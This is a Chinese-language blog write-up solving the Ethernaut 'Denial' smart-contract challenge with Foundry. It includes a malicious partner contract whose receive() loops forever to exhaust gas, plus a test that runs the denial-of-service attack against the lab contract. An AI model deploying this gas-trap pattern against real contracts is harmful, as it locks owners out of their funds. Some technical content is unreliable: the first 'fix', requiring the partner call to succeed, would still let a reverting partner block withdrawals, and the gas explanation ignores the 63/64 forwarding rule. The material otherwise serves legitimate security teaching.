---
title: 'Ethernaut Level 20: Denial - 通过外部调用实现拒绝服务'
date: 2025-01-25 16:45:00
updated: 2025-01-25 16:45:00
categories:
  - Ethernaut 系列
  - 进阶攻击篇 (11-20)
tags:
  - Ethernaut
  - Foundry
  - Denial of Service
  - DoS
  - unchecked call
  - 智能合约安全
series: Ethernaut Foundry Solutions
excerpt: "学习如何利用一个不受信任的外部调用来发动拒绝服务（DoS）攻击。通过设置一个恶意的 `partner` 合约，使其在接收以太币时耗尽所有 Gas，从而阻止 `owner` 提取资金，掌握 Denial 关卡的破解技巧。"
---

# 🎯 Ethernaut Level 20: Denial - 通过外部调用实现拒绝服务

> **关卡链接**: [Ethernaut Level 20 - Denial](https://ethernaut.openzeppelin.com/level/20)  
> **攻击类型**: 拒绝服务 (Denial of Service - DoS)  
> **难度**: ⭐⭐☆☆☆

## 📋 挑战目标

本关的目标是阻止 `owner` 从合约中提取资金。你需要让 `withdraw()` 函数无法成功执行，从而实现拒绝服务攻击。

![Denial Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel20.svg)

## 🔍 漏洞分析

让我们仔细看看 `withdraw()` 函数的实现：

```solidity
contract Denial {
    // ...
    address public partner; // The partner can be set by anyone.

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        
        // Perform the call. We don't check the return value.
        partner.call{value: amountToSend}("");
        
        payable(owner).transfer(amountToSend);
    }
}
```

漏洞点非常明确：

1.  **任意设置 `partner`**: 任何人都可以调用 `setWithdrawPartner()` 来设置 `partner` 地址。这意味着我们可以将 `partner` 设置为我们自己控制的恶意合约。
2.  **未检查的外部调用**: `partner.call{value: amountToSend}("")` 是一个对外部合约的调用。关键在于，代码**没有检查 `call` 的返回值**。如果这个 `call` 失败，函数会继续执行。
3.  **Gas 转发**: `call` 默认会转发所有剩余的 Gas。如果 `partner` 合约的 `receive()` 或 `fallback()` 函数是一个 Gas 陷阱（例如，一个无限循环），它将耗尽所有 Gas，导致整个 `withdraw()` 交易因 `out of gas` 而失败。

攻击思路就是利用这一点。我们将部署一个恶意合约，并将其设置为 `partner`。当 `owner` 调用 `withdraw()` 时，对我们恶意合约的 `call` 将会执行，触发我们的恶意逻辑，从而使整个交易失败。

我们的恶意合约只需要一个 `receive()` 函数，其中包含一个无限循环：

```solidity
contract MaliciousPartner {
    receive() external payable {
        // Consume all gas
        while (true) {}
    }
}
```

当 `withdraw()` 函数向这个合约发送以太币时，`receive()` 函数被触发，进入无限循环，耗尽所有 Gas，导致 `withdraw()` 交易 `revert`。`owner` 永远无法成功提取资金。

## 💻 Foundry 实现

### 攻击合约代码

攻击合约非常简单，只需要一个 `receive()` 函数。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 恶意合约，用于发动 DoS 攻击
contract Attack {
    // 当接收到以太币时，进入无限循环以耗尽所有 Gas
    receive() external payable {
        while (true) {}
    }
}
```

### Foundry 测试代码

测试代码需要验证 `withdraw()` 调用确实失败了。我们可以使用 Foundry 的 `vm.expectRevert()` 来实现这一点。

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/20_Denial.sol";

contract DenialTest is Test {
    Denial instance;
    Attack attacker;
    address owner;
    address player; // 攻击者

    function setUp() public {
        owner = vm.addr(1);
        player = vm.addr(2);

        // 部署 Denial 合约并存入 1 ether
        vm.startPrank(owner);
        instance = new Denial();
        vm.deal(address(instance), 1 ether);
        vm.stopPrank();

        // 部署攻击合约
        attacker = new Attack();
    }

    function testDenialOfServiceAttack() public {
        // 1. 攻击者将恶意合约设置为 partner
        vm.prank(player);
        instance.setWithdrawPartner(address(attacker));

        // 2. owner 尝试提款
        vm.startPrank(owner);
        uint256 initialOwnerBalance = owner.balance;

        // 3. 断言交易会失败 (revert)
        // 因为对恶意 partner 的调用会耗尽所有 gas
        vm.expectRevert();
        instance.withdraw();

        // 4. 验证 owner 的余额没有增加
        assertEq(owner.balance, initialOwnerBalance);
        vm.stopPrank();
    }
}
```

### 关键攻击步骤

1.  **部署恶意合约**: 创建一个 `Attack` 合约，其 `receive()` 函数包含一个无限循环。
2.  **设置 `partner`**: 调用 `setWithdrawPartner()`，将 `Denial` 合约的 `partner` 设置为 `Attack` 合约的地址。
3.  **触发漏洞**: 当 `owner` 调用 `withdraw()` 时，对 `partner` 的 `call` 会触发 `Attack` 合约的 `receive()` 函数，耗尽所有 Gas，导致整个交易失败。

## 🛡️ 防御措施

1.  **检查外部调用的返回值**: 永远不要假设外部调用会成功。必须检查 `call` 的返回值，并对失败情况进行处理。

    ```solidity
    // 修复建议
    (bool sent, ) = partner.call{value: amountToSend}("");
    require(sent, "Failed to send Ether to partner");
    ```

2.  **遵循“检查-生效-交互”模式**: 应该在所有状态变更之后再与外部合约交互。虽然在本例中不是直接原因，但这是一个通用的安全最佳实践。
3.  **限制 Gas**: 在进行外部调用时，明确指定转发的 Gas 数量，而不是使用默认的全额转发。这可以限制恶意合约可能造成的损害。

    ```solidity
    // 限制 Gas
    partner.call{value: amountToSend, gas: 50000}("");
    ```

4.  **引入提款模式 (Pull-over-Push)**: 不要主动“推送”资金给用户，而是让用户自己“拉取”（提款）。用户调用一个函数来提款，而不是合约自动发送资金。这可以防止因外部调用失败而导致的问题。

## 🔧 相关工具和技术

-   **拒绝服务 (DoS)**: 一种常见的攻击类型，旨在使系统无法为合法用户提供服务。
-   **`call`**: Solidity 中用于与其他合约交互的底层函数。它功能强大但也很危险，需要小心使用。
-   **`receive()` 函数**: 合约在接收到没有 `calldata` 的以太币时执行的特殊函数。
-   **Gas**: EVM 中用于衡量计算成本的单位。对 Gas 的操纵是许多高级攻击的基础。

## 🎯 总结

**核心概念**:
-   对外部合约的调用是不可信的，可能会失败或被恶意利用。
-   必须始终检查底层 `call` 的返回值。
-   不受限制的 Gas 转发会给恶意合约执行任意复杂（且耗 Gas）代码的机会。

**攻击向量**:
-   通过一个可被任意设置的地址，将恶意合约引入到目标合约的执行流程中。
-   在恶意合约的 `receive()` 或 `fallback()` 函数中制造 Gas 陷阱，耗尽交易的 Gas，导致主调用失败。

**防御策略**:
-   检查 `call` 的返回值。
-   限制外部调用的 Gas。
-   优先使用“提款”模式而不是“推送”模式。

## 📚 参考资料

-   [Solidity Docs: Sending Ether](https://docs.soliditylang.org/en/latest/contracts.html#sending-ether)
-   [Consensys: Denial of Service](https://consensys.net/diligence/blog/2018/05/known-attacks-in-smart-contracts-and-how-to-avoid-them/#denial-of-service-dos)